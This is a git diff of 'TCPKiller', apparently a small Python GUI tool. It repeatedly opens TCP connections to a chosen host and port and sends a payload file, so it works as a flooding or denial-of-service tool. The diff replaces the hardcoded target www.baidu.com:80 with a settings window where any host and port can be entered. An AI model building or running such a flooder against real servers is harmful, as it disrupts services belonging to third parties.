@@ -2,15 +2,28 @@
 import socket
 import threading
 import time
+import sys
 from tkinter import *
 
 shouldq=0
 xs=10 #x-size
 ys=7 #y-size
 t=1 #error-delay-time
-host='www.baidu.com' #target-hostname
-port=80 #target-port
-ver='1.0' #version
+ver='2.0' #version
+inited=False
+
+def initt():
+    global inited,host,port,content
+    inited=True
+    host=hostvar.get()
+    port=portvar.get()
+    try:
+        f=open('content.txt','br')
+        content=f.read()
+        f.close()
+    except:
+        content=''
+    setup.destroy()
 
 def k(y,x):
     global shouldq
@@ -64,35 +77,58 @@ def test():
         s.connect((host,port))
         s.send(content)
         s.close()
-    except (ConnectionRefusedError,TimeoutError) as e:
-        messagebox.showwarning('TCPKiller',str(e))
+    except (OSError,ConnectionRefusedError,TimeoutError) as e:
+        messagebox.showwarning('TCPKiller',str(e)+'\n'+host+':'+str(port))
     except:
         messagebox.showerror('TCPKiller','未知错误')
         raise
     else:
-        messagebox.showinfo('TCPKiller','测试成功')
-    
+        messagebox.showinfo('TCPKiller','测试成功\n'+host+':'+str(port))
 
+def init():
+    global hostvar,portvar,setup
+    setup=Tk()
+    hostvar=StringVar() #target-hostname
+    portvar=IntVar() #target-port
+
+    ipselect=Entry(setup,textvariable=hostvar)
+    portselect=Entry(setup,textvariable=portvar)
+    setupdone=Button(setup,text='保存',command=initt)
+
+    setup.title('设置')
+    setup.resizable(False,False)
+    Label(setup,text='主机').grid(row=0,column=0)
+    ipselect.grid(row=0,column=1)
+    Label(setup,text='端口').grid(row=1,column=0)
+    portselect.grid(row=1,column=1)
+    setupdone.grid(row=2,column=0,columnspan=2)
+    mainloop()
+
+
+init()
+global tk
 tk=Tk()
+if not inited:
+    tk.destroy()
+    sys.exit(-1)
+
 sta=[[0 for col in range(xs)] for row in range(ys)]
+
 for y in range(ys):
     for x in range(xs):
         sta[y][x]=Button(tk,text='　　')
         sta[y][x].grid(column=x,row=y)
+
 bs=Button(tk,text='开始',command=st)
 bs.grid(column=xs+1,row=0)
-bk=Button(tk,text='结束',command=kill)
+bk=Button(tk,text='停止',command=kill)
 bk.grid(column=xs+1,row=1)
 bk=Button(tk,text='测试',command=test)
 bk.grid(column=xs+1,row=2)
-tk.title('TCPKiller '+ver)
 
-try:
-    f=open('content.txt','br')
-    content=f.read()
-    f.close()
-except:
-    content=''
+tk.resizable(False,False)
+tk.title('TCPKiller '+ver)
 
 mainloop()
 kill()
+tk.destroy()
